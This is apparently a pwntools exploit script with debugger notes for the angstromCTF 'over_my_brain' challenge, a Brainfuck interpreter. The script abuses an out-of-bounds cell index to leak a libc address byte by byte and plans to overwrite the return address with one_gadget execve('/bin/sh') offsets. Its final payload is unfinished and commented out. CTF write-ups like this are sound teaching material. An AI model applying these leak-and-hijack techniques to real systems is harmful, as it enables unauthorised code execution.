#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host shell.actf.co --port 19010 ./over_my_brain
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./over_my_brain')

context.terminal = ['tmux', 'splitw', '-h']

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'shell.actf.co'
port = int(args.PORT or 19010)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
#gdbscript = '''
#break *0x{exe.symbols.main:x}
#continue
#'''.format(**locals())

gdbscript = '''
b *0x401428
ignore 1 8
continue'''

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

# We need to change `i` so cells+i points to retaddr
#
# [ ] <-- this is loop in brainfuck
# The loop counter is on `cells+i`
# And `i` starts with 0
# `i` can be incremented with `+`
# the `]` stops when *(cells+i) == 0
#
# It turns out that this code: `+[>>+].`
# Stops at i=288 which is nice:
# (b *0x401428 <-- stops on putchar() so on `.` opcode)
"""
pwndbg> b *0x401428
Breakpoint 6 at 0x401428
"""
# As we can see, with this input, the cells+i is not that far from retaddr, we can manually set it!
"""
pwndbg> r
Starting program: /home/dc/angstromctf/over_my_brain_pwn/over_my_brain
enter some brainf code: +[>>+].
cells=0x7fffffffdc40, i (0x7fffffffdd64)=288, p (0x7fffffffdd60)=6

Breakpoint 6, 0x0000000000401428 in main ()
pwndbg> retaddr
0x7fffffffdd88 —▸ 0x7ffff7a05b97 (__libc_start_main+231) ◂— mov    edi, eax
0x7fffffffde48 —▸ 0x40110e (_start+46) ◂— hlt
pwndbg> distance 0x7fffffffdc40+288 0x7fffffffdd88
0x7fffffffdd60->0x7fffffffdd88 is 0x28 bytes (0x5 words)
"""

# For example this is too far:
"""
pwndbg> r
Starting program: /home/dc/angstromctf/over_my_brain_pwn/over_my_brain
enter some brainf code: +[>>>>>>>>>>>>>>>>>>>>>>>>>>+].
cells=0x7fffffffdc40, i (0x7fffffffdd64)=468, p (0x7fffffffdd60)=30

Breakpoint 6, 0x0000000000401428 in main ()

pwndbg> retaddr
0x7fffffffdd88 —▸ 0x7ffff7a05b97 (__libc_start_main+231) ◂— mov    edi, eax
0x7fffffffde48 —▸ 0x40110e (_start+46) ◂— hlt

pwndbg> distance 0x7fffffffdc40+468 0x7fffffffdd88
0x7fffffffde14->0x7fffffffdd88 is -0x8c bytes (-0x12 words)

pwndbg> distance 0x7fffffffdc40+468 0x7fffffffde48
0x7fffffffde14->0x7fffffffde48 is 0x34 bytes (0x6 words)
"""

# But we can take 1st attempt and manually add `i`:
# But.. this will let us change the __libc_start_main+231
# This is not a nice address
"""
pwndbg> r
Starting program: /home/dc/angstromctf/over_my_brain_pwn/over_my_brain
enter some brainf code: +[>>+].>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>.
cells=0x7fffffffdc40, i (0x7fffffffdd64)=288, p (0x7fffffffdd60)=6

Breakpoint 6, 0x0000000000401428 in main ()
pwndbg> c
Continuing.
cells=0x7fffffffdc40, i (0x7fffffffdd64)=328, p (0x7fffffffdd60)=47

Breakpoint 6, 0x0000000000401428 in main ()
pwndbg> retaddr
0x7fffffffdd88 —▸ 0x7ffff7a05b97 (__libc_start_main+231) ◂— mov    edi, eax
0x7fffffffde48 —▸ 0x40110e (_start+46) ◂— hlt
pwndbg> distance 0x7fffffffdc40+328 0x7fffffffdd88
0x7fffffffdd88->0x7fffffffdd88 is 0x0 bytes (0x0 words)
"""
# So we can take 2nd attempt = when we get +468, increment `i` manually to the 2nd retaddr and change it to flag!

# This looks good:
"""
pwndbg> r
Starting program: /home/dc/angstromctf/over_my_brain_pwn/over_my_brain
enter some brainf code: +[>>>>>>>>>>>>>>>>>>>>>>>>>>+].>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>.
cells=0x7fffffffdc40, i (0x7fffffffdd64)=468, p (0x7fffffffdd60)=30

Breakpoint 6, 0x0000000000401428 in main ()
pwndbg> c
Continuing.
cells=0x7fffffffdc40, i (0x7fffffffdd64)=520, p (0x7fffffffdd60)=83

Breakpoint 6, 0x0000000000401428 in main ()
pwndbg> retaddr
0x7fffffffdd88 —▸ 0x7ffff7a05b97 (__libc_start_main+231) ◂— mov    edi, eax
0x7fffffffde48 —▸ 0x40110e (_start+46) ◂— hlt
pwndbg> distance 0x7fffffffdc40+520 0x7fffffffde48
0x7fffffffde48->0x7fffffffde48 is 0x0 bytes (0x0 words)
"""


# This input sets us at i=520 == retaddr to _start+46
# +[>>>>>>>>>>>>>>>>>>>>>>>>>>+].>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>.

# This sets retaddr to _start+30
# +[>>>>>>>>>>>>>>>>>>>>>>>>>>+].>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>.[-].

# +[>+].
# i=288

#pwndbg> distance 0x7fffffffdc40+288 0x7fffffffdd88
#0x7fffffffdd60->0x7fffffffdd88 is 0x28 bytes (0x5 words)

# +[>+]>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>.


## print retaddr+1 and LOOP:
# +[>+]>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>.-------

io.recvuntil('code: ')
io.sendline('+[>+]>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>.-------')
a = io.recv(1)
io.recvuntil('code: ')
io.sendline('+[>+]>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>.<-------')
b = io.recv(1)
io.recvuntil('code: ')
io.sendline('+[>+]>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>.<<-------')
c = io.recv(1)
io.recvuntil('code: ')
io.sendline('+[>+]>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>.<<<-------')
d = io.recv(1)
io.recvuntil('code: ')
io.sendline('+[>+]>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>.<<<<-------')
e = io.recv(1)
io.recvuntil('code: ')
io.sendline('+[>+]>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>.<<<<<-------')
f = io.recv(1)
io.recvuntil('code: ')
io.sendline('+[>+]>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>.<<<<<<-------')
g = io.recv(1)
io.recvuntil('code: ')
io.sendline('+[>+]>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>.<<<<<<<-------')
h = io.recv(1)

libc_start_main = u64(a+b+c+d+e+f+g+h)
libc_base = libc_start_main - 0x20830

print("libc_start_main ret = 0x%x" % libc_start_main)
print("libc_base           = 0x%x" % libc_base)

"""
dc@ubuntu:~/angstromctf/over_my_brain_pwn$ one_gadget libc-2.23.so
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""

#                 4 52 16 gadgets
#                 4 52 6a
#                 f 02 a4
#                 f 11 47
#                 2 08 30 <-- libc_start_main+xx
# 0x 00 7f 01 c5 e0 88 30 <-- leeaked ^
io.recvuntil('code: ')

g1 = libc_base + 0x45216
g2 = libc_base + 0x4526a
g3 = libc_base + 0xf02a4
g4 = libc_base + 0xf1147

# Honestly, here I switched to solving this manually: I needed to fix the leaked address to point to one of the gadgets
# So I calculated all the offsets and made them during one connection and got the flag.

# Below are a bit wrong offsets, but you should get idea from this input
# 00 00 00 00 00 40 11 C6
payload = [
    '+[>+]>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>',
    # 17
    '+'*0xd,
    '>.'
    '+'*9,
    '>',
    '+'*17,
    '.'
    # 9
    # d
]



payload = ''.join(payload)
#assert len(payload)<=144, 'too long %d' % len(payload)
#io.sendline(payload)

io.interactive()

